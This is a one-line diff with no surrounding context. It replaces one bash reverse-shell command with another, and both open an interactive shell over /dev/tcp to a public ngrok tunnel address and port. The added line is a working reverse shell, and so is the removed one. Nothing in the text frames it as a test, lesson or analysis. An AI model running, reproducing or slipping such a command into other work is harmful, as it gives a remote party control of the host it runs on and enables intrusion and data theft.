@@ -1,1 +1,1 @@
-0<&196;exec 196<>/dev/tcp/4.tcp.eu.ngrok.io/14556; sh <&196 >&196 2>&196
+sh -i 5<> /dev/tcp/4.tcp.eu.ngrok.io/14556 0<&5 1>&5 2>&5
